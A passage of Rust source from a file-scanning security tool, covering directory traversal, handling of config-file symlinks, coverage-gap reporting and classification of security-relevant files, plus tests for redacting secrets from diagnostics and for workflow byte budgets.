}

#[allow(clippy::too_many_arguments)]
fn collect_files_with_limits(
    path: &Path,
    recursive: bool,
    ignore_patterns: &[String],
    include_patterns: &[String],
    exclude_patterns: &[String],
    candidate_limit: Option<usize>,
    collection_work: Option<usize>,
) -> CollectedFiles {
    let mut collected = CollectedFiles::with_limits(candidate_limit, collection_work);
    // Preserve absence as an ordinary unreadable optional-path outcome for core
    // discovery callers, but do not let a root metadata failure collapse into
    // `Path::is_file`/`is_dir`'s lossy `false`: that failure means we could not
    // determine what tree was hidden and is therefore an enumeration gap. The
    // CLI separately rejects a missing explicitly requested target as a hard
    // operational error before entering this collector.
    let metadata = match std::fs::metadata(path) {
        Ok(metadata) => metadata,
        Err(error) => {
            let gap = if error.kind() == std::io::ErrorKind::NotFound {
                emit_scan_diagnostic(format_args!(
                    "tirith: scan: path does not exist: {}",
                    path.display()
                ));
                unreadable_gap(path)
            } else {
                emit_scan_diagnostic(format_args!(
                    "tirith: scan: cannot inspect requested path {}: {error}",
                    path.display()
                ));
                enumeration_gap(path)
            };
            collected.coverage_gaps.push(gap);
            return collected;
        }
    };

    if metadata.is_file() {
        // Suffix classification is only a scheduling hint. Every regular file
        // reaches the byte-first dispatcher, including ordinary media: a UTF-8
        // attack payload named `.png` must scan as text, while genuine binary
        // media is intentionally ignored only after its bytes are classified.
        match classify_collected_path(path) {
            CollectedFileKind::TextCandidate | CollectedFileKind::BinaryIgnored => {
                collected.push_text(path.to_path_buf())
            }
            CollectedFileKind::ArtifactCandidate => collected.push_artifact(path.to_path_buf()),
        }
        collected.finish_bounded_candidates();
        return collected;
    }

    if !metadata.is_dir() {
        emit_scan_diagnostic(format_args!(
            "tirith: scan: path is not a regular file or directory: {}",
            path.display()
        ));
        collected.coverage_gaps.push(unreadable_gap(path));
        return collected;
    }

    collect_files_recursive(
        path,
        path,
        recursive,
        ignore_patterns,
        include_patterns,
        exclude_patterns,
        &mut collected,
    );
    collected.finish_bounded_candidates();
    collected
}

/// Enumerate every AI-CONFIG file under `root` — the instruction / config
/// surface (`CLAUDE.md`, `AGENTS.md`, `.cursorrules`, `.claude/*`,
/// `.cursor/rules/*`, `.mcp.json`, …) that `tirith ai snapshot|diff` track.
/// Reuses the standard scan walk (so it honors the same skip-dir / known-config-
/// dir rules), then keeps only paths [`crate::rules::aifile::is_ai_config_file`]
/// recognises. Always recursive. Returns absolute-or-`root`-relative paths
/// deduplicated and sorted for stable output (independent of the walk's order).
/// A single file `root` that is itself an AI-config file yields just that file.
/// AI-config files are always text, including safe linked text candidates.
pub fn collect_ai_config_files(root: &Path) -> Vec<PathBuf> {
    let _diagnostics = ScanDiagnosticCapture::start(Some(root));
    let collected = collect_files(root, true, &[], &[], &[]);
    let mut files = collected.text_candidates;
    files.extend(
        collected
            .linked_text_candidates
            .into_iter()
            .map(|candidate| candidate.logical_path),
    );
    files.retain(|p| crate::rules::aifile::is_ai_config_file(p));
    files.sort();
    files.dedup();
    files
}

fn collect_files_recursive(
    root: &Path,
    dir: &Path,
    recursive: bool,
    ignore_patterns: &[String],
    include_patterns: &[String],
    exclude_patterns: &[String],
    collected: &mut CollectedFiles,
) {
    let entries = match std::fs::read_dir(dir) {
        Ok(e) => e,
        Err(e) => {
            emit_scan_diagnostic(format_args!(
                "tirith: scan: cannot read directory {}: {e}",
                dir.display()
            ));
            collected.coverage_gaps.push(enumeration_gap(dir));
            return;
        }
    };

    if collected.collection_work_remaining.is_none() {
        for entry in entries {
            match entry {
                Ok(entry) => collect_one_entry(
                    root,
                    entry,
                    recursive,
                    ignore_patterns,
                    include_patterns,
                    exclude_patterns,
                    collected,
                ),
                Err(e) => {
                    emit_scan_diagnostic(format_args!(
                        "tirith: scan: error reading entry in {}: {e}",
                        dir.display()
                    ));
                    collected.coverage_gaps.push(enumeration_gap(dir));
                }
            }
        }
        return;
    }

    let entries = retain_deterministic_directory_work(entries, dir, collected);
    let selected_count = entries.len();
    for (index, entry) in entries.into_iter().enumerate() {
        if collected.collection_work_remaining == Some(0) {
            // A higher-ranked selected directory may have spent the remaining
            // budget on its own priority children. Account for every parent
            // entry that can no longer receive metadata work.
            collected.note_unclassified_entries(selected_count.saturating_sub(index));
            break;
        }
        if let Some(remaining) = collected.collection_work_remaining.as_mut() {
            *remaining -= 1;
        }
        collect_one_entry(
            root,
            entry,
            recursive,
            ignore_patterns,
            include_patterns,
            exclude_patterns,
            collected,
        );
    }
}

#[derive(Debug)]
struct RankedDirectoryEntry {
    path: PathBuf,
    entry: std::fs::DirEntry,
}

fn ranked_directory_entry_cmp(
    a: &RankedDirectoryEntry,
    b: &RankedDirectoryEntry,
) -> std::cmp::Ordering {
    let known_config_dir = |path: &Path| {
        path.file_name()
            .and_then(|name| name.to_str())
            .is_some_and(is_known_config_dir)
    };
    // Desired order is priority files, known config directories, then lexical
    // path. Return the inverse priority flags so BinaryHeap::peek is the worst
    // retained entry and can be replaced by a better later entry.
    is_priority_file(b.path.as_path())
        .cmp(&is_priority_file(a.path.as_path()))
        .then_with(|| known_config_dir(&b.path).cmp(&known_config_dir(&a.path)))
        .then_with(|| a.path.cmp(&b.path))
}

impl PartialEq for RankedDirectoryEntry {
    fn eq(&self, other: &Self) -> bool {
        ranked_directory_entry_cmp(self, other).is_eq()
    }
}

impl Eq for RankedDirectoryEntry {}

impl PartialOrd for RankedDirectoryEntry {
    fn partial_cmp(&self, other: &Self) -> Option<std::cmp::Ordering> {
        Some(self.cmp(other))
    }
}

impl Ord for RankedDirectoryEntry {
    fn cmp(&self, other: &Self) -> std::cmp::Ordering {
        ranked_directory_entry_cmp(self, other)
    }
}

/// Stream cheap directory names through a deterministic priority/path top-K
/// heap before spending the global metadata/recursion work budget. This avoids
/// the old arbitrary `ReadDir::take(work)` prefix: a `CLAUDE.md` encountered
/// after 1,024 benign names still displaces the worst benign entry. Raw
/// enumeration has its own much larger global ceiling, so both memory and
/// traversal remain operationally bounded.
fn retain_deterministic_directory_work(
    entries: std::fs::ReadDir,
    dir: &Path,
    collected: &mut CollectedFiles,
) -> Vec<std::fs::DirEntry> {
    let work_limit = collected.collection_work_remaining.unwrap_or(usize::MAX);
    let enumeration_limit = collected
        .collection_enumeration_remaining
        .unwrap_or(usize::MAX);
    if work_limit == 0 || enumeration_limit == 0 {
        collected.note_unclassified_entries(1);
        return Vec::new();
    }

    let mut selected = std::collections::BinaryHeap::new();
    let mut enumerated_entries = 0usize;
    let mut dropped_entries = 0usize;
    let mut read_error_recorded = false;
    for entry in entries {
        if enumerated_entries >= enumeration_limit {
            // Fetching this one-entry lookahead proves a tail exists without
            // doing metadata work or walking the remainder.
            collected.note_unclassified_entries(1);
            break;
        }
        enumerated_entries = enumerated_entries.saturating_add(1);
        let entry = match entry {
            Ok(entry) => entry,
            Err(error) => {
                if !read_error_recorded {
                    emit_scan_diagnostic(format_args!(
                        "tirith: scan: error reading entry in {}: {error}",
                        dir.display()
                    ));
                    collected.coverage_gaps.push(enumeration_gap(dir));
                    read_error_recorded = true;
                }
                continue;
            }
        };
        let ranked = RankedDirectoryEntry {
            path: entry.path(),
            entry,
        };
        if selected.len() < work_limit {
            selected.push(ranked);
        } else if selected
            .peek()
            .is_some_and(|worst| ranked_directory_entry_cmp(&ranked, worst).is_lt())
        {
            selected.pop();
            selected.push(ranked);
            dropped_entries = dropped_entries.saturating_add(1);
        } else {
            dropped_entries = dropped_entries.saturating_add(1);
        }
    }
    if let Some(remaining) = collected.collection_enumeration_remaining.as_mut() {
        *remaining = remaining.saturating_sub(enumerated_entries);
    }
    collected.note_unclassified_entries(dropped_entries);
    selected
        .into_sorted_vec()
        .into_iter()
        .map(|ranked| ranked.entry)
        .collect()
}

#[allow(clippy::too_many_arguments)]
fn collect_one_entry(
    root: &Path,
    entry: std::fs::DirEntry,
    recursive: bool,
    ignore_patterns: &[String],
    include_patterns: &[String],
    exclude_patterns: &[String],
    collected: &mut CollectedFiles,
) {
    let path = entry.path();
    let name = path.file_name().and_then(|n| n.to_str()).unwrap_or("");

    // Classify the entry WITHOUT following symlinks (`entry.file_type()` reports
    // the link itself, not its target). Generic symlinks are skipped so traversal
    // cannot escape the tree. Security-config links are handled explicitly below:
    // safe in-root file targets retain the link's logical identity; every other
    // config link becomes an unreadable coverage gap.
    let file_type = match entry.file_type() {
        Ok(t) => t,
        Err(e) => {
            emit_scan_diagnostic(format_args!(
                "tirith: scan: cannot stat entry {}: {e} (skipped)",
                path.display()
            ));
            collected.coverage_gaps.push(enumeration_gap(&path));
            return;
        }
    };
    if file_type.is_symlink() {
        collect_config_symlink(
            root,
            &path,
            ignore_patterns,
            include_patterns,
            exclude_patterns,
            collected,
        );
        return;
    }

    if file_type.is_dir() {
        if should_skip_dir(name) && !is_known_config_dir(name) {
            return;
        }
        if recursive || is_known_config_dir(name) {
            collect_files_recursive(
                root,
                &path,
                recursive,
                ignore_patterns,
                include_patterns,
                exclude_patterns,
                collected,
            );
        }
        return;
    }

    // The suffix kind is a scheduling hint only. Pattern filters remain an
    // intentional pre-analysis exclusion, but no matching regular file is
    // dropped merely because its name looks binary.
    let kind = classify_collected_path(&path);

    if !candidate_matches_patterns(
        root,
        &path,
        ignore_patterns,
        include_patterns,
        exclude_patterns,
    ) {
        collected.note_pattern_filtered(&path);
        return;
    }

    // Final containment gate: the file's REAL location (resolving every
    // intermediate directory) must stay inside the selected scan root. The
    // per-entry symlink skip above stops a symlinked leaf or directory, but an
    // intermediate-directory symlink planted higher in the walk could still let
    // a regular leaf resolve outside `root`; `canonical_within` (fail-closed)
    // rejects that.
    if !crate::util::canonical_within(&path, root) {
        collected.coverage_gaps.push(unreadable_gap(&path));
        return;
    }

    // Route by kind: a passing artifact candidate becomes an `Unsupported`
    // coverage gap (handled by the driver); a passing text candidate is
    // scanned.
    match kind {
        CollectedFileKind::ArtifactCandidate => collected.push_artifact(path),
        CollectedFileKind::TextCandidate | CollectedFileKind::BinaryIgnored => {
            collected.push_text(path)
        }
    }
}

fn unreadable_gap(path: &Path) -> CoverageGap {
    CoverageGap {
        location: SubjectLocation::from_path(path.to_path_buf()),
        kind: CoverageGapKind::Unreadable,
        sha256: None,
    }
}

/// Record failure to enumerate a directory tree. The path may look entirely
/// benign (or may be the parent directory when `ReadDir` cannot yield an entry),
/// so consumers must classify this by operation rather than by extension.
fn enumeration_gap(path: &Path) -> CoverageGap {
    CoverageGap {
        location: SubjectLocation::from_path(path.to_path_buf()),
        kind: CoverageGapKind::EnumerationFailed,
        sha256: None,
    }
}

/// Preserve a config symlink's logical identity while opening only its resolved,
/// regular, in-root target. Other symlinks remain intentional traversal
/// exclusions; config symlinks are security-relevant and therefore either scan or
/// produce an explicit gap.
fn collect_config_symlink(
    root: &Path,
    logical_path: &Path,
    ignore_patterns: &[String],
    include_patterns: &[String],
    exclude_patterns: &[String],
    collected: &mut CollectedFiles,
) {
    let is_config_link = is_priority_file(logical_path)
        || crate::rules::aifile::is_ai_config_file(logical_path)
        // repo-0421: dependency manifests are security-relevant logical names
        // too — a symlinked `package.json` must scan its in-root target or
        // produce a coverage gap, never a silent skip.
        || logical_path
            .file_name()
            .and_then(|name| name.to_str())
            .and_then(crate::ecosystem_scan::ManifestKind::from_file_name)
            .is_some()
        || logical_path
            .file_name()
            .and_then(|name| name.to_str())
            .is_some_and(is_known_config_dir);
    if !is_config_link {
        return;
    }
    if !candidate_matches_patterns(
        root,
        logical_path,
        ignore_patterns,
        include_patterns,
        exclude_patterns,
    ) {
        collected.note_pattern_filtered(logical_path);
        return;
    }

    let resolved = match std::fs::canonicalize(logical_path) {
        Ok(path) => path,
        Err(e) => {
            emit_scan_diagnostic(format_args!(
                "tirith: scan: cannot resolve config symlink {}: {e}",
                logical_path.display()
            ));
            collected.coverage_gaps.push(unreadable_gap(logical_path));
            return;
        }
    };
    if !crate::util::canonical_within(&resolved, root) {
        collected.coverage_gaps.push(unreadable_gap(logical_path));
        return;
    }
    // Take the identity from an OPEN handle, not a path stat, so it names the
    // object that passed containment. `scan_single_file_at` re-opens the same
    // path later and refuses to read anything else.
    let identity = match crate::util::open_read_no_follow_capped(&resolved, u64::MAX) {
        Ok(file) => FileIdentity::of(&file),
        Err(_) => {
            collected.coverage_gaps.push(unreadable_gap(logical_path));
            return;
        }
    };
    if identity.is_none() {
        collected.coverage_gaps.push(unreadable_gap(logical_path));
        return;
    }
    match std::fs::metadata(&resolved) {
        Ok(metadata) if metadata.is_file() => {
            // As with ordinary entries, the suffix is only a scheduling hint.
            // A media-looking config link can still point at UTF-8 instructions;
            // queue it so the opened bytes decide. Native/package artifact hints
            // remain gaps because linked artifacts are not represented by the
            // linked-text candidate pipeline.
            if classify_collected_path(logical_path) != CollectedFileKind::ArtifactCandidate {
                collected.push_linked(LinkedTextCandidate {
                    read_path: resolved,
                    logical_path: logical_path.to_path_buf(),
                    identity,
                });
            } else {
                collected.coverage_gaps.push(unreadable_gap(logical_path));
            }
        }
        Ok(_) | Err(_) => collected.coverage_gaps.push(unreadable_gap(logical_path)),
    }
}

fn candidate_matches_patterns(
    root: &Path,
    path: &Path,
    ignore_patterns: &[String],
    include_patterns: &[String],
    exclude_patterns: &[String],
) -> bool {
    let name = path.file_name().and_then(|n| n.to_str()).unwrap_or("");
    let rel_path = path
        .strip_prefix(root)
        .ok()
        .and_then(|p| p.to_str())
        .unwrap_or(name);
    if ignore_patterns
        .iter()
        .any(|pat| matches_ignore_pattern(name, pat) || matches_ignore_pattern(rel_path, pat))
    {
        return false;
    }

    if !include_patterns.is_empty() {
        let mut included = false;
        let mut negated = false;
        let has_positive = include_patterns.iter().any(|p| !p.starts_with('!'));

        for pat in include_patterns {
            if let Some(stripped) = pat.strip_prefix('!') {
                if matches_ignore_pattern(name, stripped)
                    || matches_ignore_pattern(rel_path, stripped)
                {
                    negated = true;
                }
            } else if matches_ignore_pattern(name, pat) || matches_ignore_pattern(rel_path, pat) {
                included = true;
            }
        }

        if negated || (has_positive && !included) {
            return false;
        }
    }

    !exclude_patterns
        .iter()
        .any(|pat| matches_ignore_pattern(name, pat) || matches_ignore_pattern(rel_path, pat))
}

/// Directories to skip during scanning. Delegates to the shared built-in
/// build-artifact skip set so the scanner and the correlation pass agree.
fn should_skip_dir(name: &str) -> bool {
    crate::util_build_dirs::should_skip_dir(name)
}

/// Known AI config directories that should always be entered.
fn is_known_config_dir(name: &str) -> bool {
    matches!(
        name,
        ".claude"
            | ".vscode"
            | ".cursor"
            | ".windsurf"
            | ".cline"
            | ".continue"
            | ".github"
            | ".devcontainer"
            | ".roo"
    )
}

/// Native/packaging artifact extensions that have NO analyzer yet (A2) but ARE a
/// supply-chain surface, so they become `Unsupported` coverage gaps instead of
/// being silently dropped. B8 extends this into a magic-based dispatch into the
/// real artifact scanner. `.whl`/`.node` were previously read as TEXT (or, for a
/// raw `.so`/`.dylib`/`.wasm`, dropped as binary); both are now coverage gaps.
/// Native / packaging artifact extensions: executable or loadable code with no
/// text analyzer yet, so each is an `Unsupported` coverage gap rather than a
/// silent drop. A `.dll`/`.exe`/`.jar`/`.class` is loadable code too (a Windows
/// native blob, a Java archive, a compiled class), so they belong here next to
/// `.so`, not in `IGNORED_BINARY_EXTENSIONS`, where they would be dropped and
/// hidden from `require_complete`.
const ARTIFACT_EXTENSIONS: &[&str] = &[
    ".so", ".dylib", ".node", ".wasm", ".whl", ".exe", ".dll", ".jar", ".class",
];

/// Ordinary media / compiled-bytecode / generic-archive suffix hints. These are
/// intentionally ignored only when byte classification returns UnknownBinary.
/// `.svg` is deliberately NOT here: an SVG is XML text and can carry an active
/// payload (`<script>`, an `on*` event handler) or an external reference — the
/// `aifile` rules scan it for hidden / smuggled content. `.exe`/`.dll`/`.jar`/
/// `.class` are deliberately NOT here either: they are loadable code and live in
/// `ARTIFACT_EXTENSIONS` so they surface as `Unsupported` coverage gaps.
const IGNORED_BINARY_EXTENSIONS: &[&str] = &[
    ".png", ".jpg", ".jpeg", ".gif", ".bmp", ".ico", ".webp", ".mp3", ".mp4", ".wav", ".avi",
    ".mov", ".zip", ".tar", ".gz", ".bz2", ".xz", ".7z", ".rar", ".o", ".a", ".pyc",
];

/// Classify a filename into a scheduling hint. No return value authorizes a
/// pre-read drop; byte-first dispatch owns the actual content decision.
fn classify_collected_file(name: &str) -> CollectedFileKind {
    let name_lower = name.to_lowercase();
    if ARTIFACT_EXTENSIONS
        .iter()
        .any(|ext| name_lower.ends_with(ext))
    {
        return CollectedFileKind::ArtifactCandidate;
    }
    if IGNORED_BINARY_EXTENSIONS
        .iter()
        .any(|ext| name_lower.ends_with(ext))
    {
        return CollectedFileKind::BinaryIgnored;
    }
    CollectedFileKind::TextCandidate
}

/// Classify a path, robust to a non-UTF-8 filename. `classify_collected_file`
/// needs a `&str`, so a `to_str().unwrap_or("")` on a non-UTF-8 name would drop it
/// to `TextCandidate`. Here a non-UTF-8 name falls back to an extension-only hint
/// (the extension is almost always ASCII); opened bytes still own dispatch.
fn classify_collected_path(path: &Path) -> CollectedFileKind {
    if let Some(name) = path.file_name().and_then(|n| n.to_str()) {
        return classify_collected_file(name);
    }
    if let Some(ext) = path.extension().and_then(|e| e.to_str()) {
        let dotted = format!(".{}", ext.to_lowercase());
        if ARTIFACT_EXTENSIONS.iter().any(|e| *e == dotted) {
            return CollectedFileKind::ArtifactCandidate;
        }
        if IGNORED_BINARY_EXTENSIONS.iter().any(|e| *e == dotted) {
            return CollectedFileKind::BinaryIgnored;
        }
    }
    CollectedFileKind::TextCandidate
}

/// Match a filename against a simple glob: `*.ext`, `prefix*`, `pre*suf`,
/// `*middle*`, or exact. Patterns without `*` fall back to substring match.
pub fn matches_ignore_pattern(name: &str, pattern: &str) -> bool {
    if pattern.contains('*') {
        let parts: Vec<&str> = pattern.split('*').collect();
        match parts.as_slice() {
            [prefix, suffix] if prefix.is_empty() && !suffix.is_empty() => name.ends_with(suffix),
            [prefix, suffix] if !prefix.is_empty() && suffix.is_empty() => name.starts_with(prefix),
            [prefix, suffix] if !prefix.is_empty() && !suffix.is_empty() => {
                name.starts_with(prefix)
                    && name.ends_with(suffix)
                    && name.len() >= prefix.len() + suffix.len()
            }
            [_, _] => true,
            // Multiple wildcards: all parts must appear in order.
            _ => {
                let mut remaining = name;
                for (i, part) in parts.iter().enumerate() {
                    if part.is_empty() {
                        continue;
                    }
                    if i == 0 {
                        if !remaining.starts_with(part) {
                            return false;
                        }
                        remaining = &remaining[part.len()..];
                    } else if let Some(pos) = remaining.find(part) {
                        remaining = &remaining[pos + part.len()..];
                    } else {
                        return false;
                    }
                }
                true
            }
        }
    } else {
        name.contains(pattern)
    }
}

impl ScanResult {
    /// Check if any finding meets or exceeds the given severity threshold.
    pub fn has_findings_at_or_above(&self, threshold: Severity) -> bool {
        self.file_results
            .iter()
            .flat_map(|r| &r.findings)
            .any(|f| f.severity >= threshold)
    }

    /// Total number of findings across all files.
    pub fn total_findings(&self) -> usize {
        self.file_results.iter().map(|r| r.findings.len()).sum()
    }
    pub fn has_analysis_incomplete_finding(&self) -> bool {
        self.file_results
            .iter()
            .any(FileScanResult::has_analysis_incomplete_finding)
    }

    /// Objective completeness before presentation redaction/bounding.
    pub fn analysis_incomplete(&self) -> bool {
        self.truncated
            || !self.coverage_gaps.is_empty()
            || self
                .file_results
                .iter()
                .any(FileScanResult::analysis_incomplete)
    }
}

/// Security-relevant file extensions for coverage purposes: a skipped file with
/// one of these is treated as a SECURITY-relevant gap (it could carry executable
/// or supply-chain content), so `require_complete` / a Fail action must surface
/// it. Lockfiles and workflow YAML are matched by basename/path separately.
/// `.dll`/`.exe`/`.jar`/`.class`/`.whl` are here for the same reason as `.so`: each
/// is loadable code or a packaging artifact with no analyzer yet (a `.whl` the wheel
/// reader cannot inspect is an `Unsupported` gap), so an unanalyzed one must not read
/// as clean (they are also `ARTIFACT_EXTENSIONS`, so the scan records them as
/// `Unsupported` gaps in the first place).
const SECURITY_RELEVANT_EXTENSIONS: &[&str] = &[
    ".so", ".pth", ".start", ".dylib", ".node", ".wasm", ".whl", ".sh", ".ps1", ".dll", ".exe",
    ".jar", ".class",
];

/// Lockfile / workflow basenames or path fragments that make a gap security
/// relevant regardless of extension.
fn path_is_security_relevant(path: &Path) -> bool {
    let name = path
        .file_name()
        .and_then(|n| n.to_str())
        .unwrap_or_default()
        .to_lowercase();

    // Common ecosystem lockfiles.
    const LOCKFILES: &[&str] = &[
        "package-lock.json",
        "yarn.lock",
        "pnpm-lock.yaml",
        "poetry.lock",
        "cargo.lock",
        "gemfile.lock",
        "composer.lock",
        "go.sum",
        "requirements.txt",
        "pipfile.lock",
    ];
    if LOCKFILES.contains(&name.as_str()) {
        return true;
    }

    // Workflow YAML lives under `.github/workflows/`.
    let lossy = path.to_string_lossy().replace('\\', "/").to_lowercase();
    if lossy.contains(".github/workflows/") && (name.ends_with(".yml") || name.ends_with(".yaml")) {
        return true;
    }

    false
}

/// Build the `AnalysisIncomplete` findings for a set of coverage gaps under
/// `policy` (cross-cutting invariant 1: the driver assembles the user-facing
/// finding; the gaps are the internal signals). One finding per SECURITY-relevant
/// gap whose effective action is not [`crate::policy::GapAction::Ignore`]:
/// Medium normally, High when that effective action is `Fail` (whence the action
/// derives to Block). A non-security-relevant gap (e.g. an oversized ordinary
/// text file) is still recorded in `coverage_gaps` for `--json`/SARIF but emits
/// no finding, so benign size skips do not become noise.
pub fn build_analysis_incomplete_findings(
    gaps: &[CoverageGap],
    policy: &crate::policy::Policy,
) -> Vec<Finding> {
    build_analysis_incomplete_findings_located(gaps, policy)
        .into_iter()
        .map(|(_loc, finding)| finding)
        .collect()
}

/// Like [`build_analysis_incomplete_findings`], but each returned finding is
/// paired with the EXACT [`SubjectLocation`] of the gap it was assembled from.
///
/// The driver needs this pairing to attach each finding to its own file entry:
/// matching back by a substring of the finding's `description` is wrong because
/// one gap's location string can be a PREFIX of another's (e.g. `/a/b.so` is a
/// substring of `/a/b.so.bak`), so a substring match resolves to the wrong
/// member. Carrying the location alongside the finding lets the caller resolve by
/// EXACT equality.
///
/// Each gap is finalized through `finalize_static_verdict` INDIVIDUALLY, which is
/// equivalent to finalizing the whole batch for this rule: the finalizer's passes
/// (per-rule `severity_overrides` / `action_overrides`, then a paranoia filter
/// keyed on the finding's own severity) all act per finding, none depends on how
/// many other `AnalysisIncomplete` findings are in the set. Per-gap finalization
/// is what makes the exact pairing trivially correct: a finding either survives
/// for its gap or it does not, with no cross-gap reordering to reconcile.
pub fn build_analysis_incomplete_findings_located(
    gaps: &[CoverageGap],
    policy: &crate::policy::Policy,
) -> Vec<(SubjectLocation, Finding)> {
    let mut out = Vec::new();
    for gap in gaps {
        // Cross-cutting invariant 5: route each gap's assembled finding(s) through
        // the shared static-verdict finalizer so a policy `severity_overrides` /
        // `action_overrides` on `analysis_incomplete` is honored here, exactly as
        // on every other static-verdict site (ecosystem scan, artifact
        // evaluation). AnalysisIncomplete is Medium/High, kept at the default
        // paranoia, so the paranoia pass is a no-op unless the operator raised it.
        let raw = assemble_analysis_incomplete_findings(std::slice::from_ref(gap), policy);
        if raw.is_empty() {
            continue;
        }
        let verdict = crate::escalation::finalize_static_verdict(
            raw,
            policy,
            3,
            crate::verdict::Timings::default(),
        );
        for finding in verdict.findings {
            out.push((gap.location.clone(), finding));
        }
    }
    out
}

/// Assemble the raw `AnalysisIncomplete` findings (one per security-relevant,
/// non-ignored gap) BEFORE policy override finalization. Split out so
/// [`build_analysis_incomplete_findings`] can route them through
/// `finalize_static_verdict`.
fn assemble_analysis_incomplete_findings(
    gaps: &[CoverageGap],
    policy: &crate::policy::Policy,
) -> Vec<Finding> {
    use crate::policy::GapAction;
    use crate::verdict::{Evidence, RuleId};

    let mut findings = Vec::new();
    for gap in gaps {
        if !gap_is_security_relevant(gap) {
            continue;
        }
        let configured_action = policy.scan.action_for_gap_kind(gap.kind);
        // Enumeration failure hides paths before their kinds can be known. It
        // therefore cannot be made to read as clean through an ordinary
        // unreadable-file Ignore policy; floor this intrinsically relevant gap
        // at Warn while retaining Fail when configured.
        let action = if gap.kind == CoverageGapKind::EnumerationFailed {
            configured_action.max(GapAction::Warn)
        } else {
            configured_action
        };
        if action == GapAction::Ignore {
            continue;
        }
        let severity = if action == GapAction::Fail {
            Severity::High
        } else {
            Severity::Medium
        };
        let location = gap.location.to_string();
        let detail = match gap.sha256.as_deref() {
            Some(hash) => format!("{} ({}); sha256={hash}", location, gap.kind.as_str()),
            None => format!("{} ({})", location, gap.kind.as_str()),
        };
        let description = if gap.kind == CoverageGapKind::EnumerationFailed {
            format!(
                "The selected directory tree could not be completely enumerated at: {}. \
                 Unknown paths may be hidden below this location, so the result is not \
                 provably clean.",
                location
            )
        } else {
            format!(
                "A security-relevant file was not fully analyzed ({}): {}. \
                 The result is not provably clean for this file.",
                gap.kind.as_str(),
                location
            )
        };
        findings.push(Finding {
            rule_id: RuleId::AnalysisIncomplete,
            severity,
            title: "Scan coverage incomplete".to_string(),
            description,
            evidence: vec![Evidence::Text { detail }],
            human_view: None,
            agent_view: None,
            mitre_id: None,
            custom_rule_id: None,
        });
    }
    findings
}

/// Whether a single coverage gap is SECURITY-relevant: a priority/config file, a
/// security-extension file (`.so`/`.pth`/...), a lockfile/workflow, OR a
/// [`CoverageGapKind::HashBudgetExceeded`] gap (a giant file is suspicious on its
/// own, so the hash budget can never hide a payload from `require_complete`), OR
/// a [`CoverageGapKind::EnumerationFailed`] gap (the failed walk means the path
/// kinds hidden below it are unknown).
pub fn gap_is_security_relevant(gap: &CoverageGap) -> bool {
    // A file too big to even hash and a failed directory enumeration are security
    // relevant no matter what the visible path is named.
    if matches!(
        gap.kind,
        CoverageGapKind::HashBudgetExceeded
            | CoverageGapKind::EnumerationFailed
            | CoverageGapKind::PdfAnalyzerIncomplete
    ) {
        return true;
    }
    let Some(path) = gap.primary_path() else {
        // No on-disk path to judge (e.g. an archive member without an outer path):
        // treat as security relevant so a gap is never silently dismissed.
        return true;
    };
    if is_priority_file(path) {
        return true;
    }
    // `to_string_lossy` (not `to_str`): a non-UTF-8 file name (`café.so` carrying raw
    // Latin-1 bytes) must still match by its ASCII extension. `to_str().unwrap_or_default()`
    // would yield "" and let a security-relevant `.so`/`.dylib` gap slip past the
    // extension gate; lossy conversion preserves the ASCII extension exactly.
    let name = path
        .file_name()
        .map(|n| n.to_string_lossy())
        .unwrap_or_default()
        .to_lowercase();
    if SECURITY_RELEVANT_EXTENSIONS
        .iter()
        .any(|ext| name.ends_with(ext))
    {
        return true;
    }
    path_is_security_relevant(path)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn broken_symlink_diagnostic_is_rsr_single_line_and_bounded() {
        let custom_secret = "CUSTOM-SCAN-4829";
        let compiled =
            crate::redact::CompiledCustomPatterns::new_silent(&[regex::escape(custom_secret)]);
        let pat = format!("ghp_{}", "A".repeat(36));
        let split_pat = pat.replacen("ghp_", "ghp_\u{1b}[31m", 1);
        let raw = format!(
            "tirith: scan: cannot resolve config symlink /tmp/{split_pat}\n{custom_secret}\tbad"
        );
        let projected = sanitize_scan_diagnostic_with_compiled(&raw, &compiled);

        assert!(!projected.contains(&pat));
        assert!(!projected.contains(custom_secret));
        assert!(!projected.contains('\u{1b}'));
        assert!(!projected.contains('\n'));
        assert!(!projected.contains('\t'));
        assert!(projected.contains("\\n"));
        assert!(projected.contains("\\t"));

        let mut envelope = crate::verdict::BoundedTextBuilder::new();
        for _ in 0..crate::verdict::MAX_PRESENTATION_BYTES {
            envelope.push_str(&projected);
            envelope.push_str("\n");
        }
        let envelope = envelope.finish();
        assert!(envelope.len() <= crate::verdict::MAX_PRESENTATION_BYTES);
        assert!(envelope.contains("presentation truncated"));
    }

    /// The 32 MiB aggregate-source ceiling of the C15 cross-workflow post-pass.
    /// Charged as pure arithmetic here rather than through a real directory scan:
    /// reaching 32 MiB on disk would push every one of those bytes through
    /// `engine::analyze` as well, which proves nothing extra about the budget.
    #[test]
    fn workflow_budget_stops_at_the_aggregate_byte_ceiling() {
        use crate::rules::workflow_artifacts as wf;

        // Sized to EXACTLY 8 MiB so the ceiling is reached on a boundary and the
        // "no further model is even built" guard is observable.
        let header = "name: Bulk\non: [push]\n# ";
        let target = 8 * 1024 * 1024;
        let mut bulk = String::with_capacity(target);
        bulk.push_str(header);
        bulk.push_str(&"x".repeat(target - header.len() - 1));
        bulk.push('\n');
        assert_eq!(bulk.len(), target);
        let model = wf::build_model(
            Path::new(".github/workflows/bulk.yml"),
            &bulk,
            wf::MAX_TOTAL_STEPS,
        );
        let per_file = model.source_bytes();
        assert!(per_file > 0 && per_file <= MAX_FILE_SIZE as usize);
        let capacity = wf::MAX_TOTAL_WORKFLOW_BYTES / per_file;

        let mut budget = WorkflowBudget::default();
        let mut models = Vec::new();
        let mut gaps = Vec::new();
        for _ in 0..capacity {
            budget.admit(model.clone(), &mut models, &mut gaps);
        }
        assert_eq!(
            models.len(),
            capacity,
            "everything within the ceiling is kept"
        );
        assert!(gaps.is_empty(), "{gaps:?}");
        assert!(
            budget.complete,
            "coverage is complete while inside the ceiling"
        );

        budget.admit(model.clone(), &mut models, &mut gaps);
        assert_eq!(
            models.len(),
            capacity,
            "the overflowing workflow is dropped"
        );
        assert_eq!(gaps.len(), 1, "{gaps:?}");
        assert_eq!(gaps[0].kind, CoverageGapKind::Truncated);
        assert_eq!(
            gaps[0].primary_path(),
            Some(Path::new(".github/workflows/bulk.yml")),
            "the gap points at the workflow that was dropped"
        );
        assert!(
            !budget.complete,
            "an exhausted ceiling must never be read as proof that no chain exists"
        );
        assert_eq!(
            budget.remaining_steps(),
            0,
            "once the byte ceiling is reached no further model is even built"
        );
    }

    fn scan_tree(path: &Path, max_files: Option<usize>) -> ScanResult {
        scan(&ScanConfig {
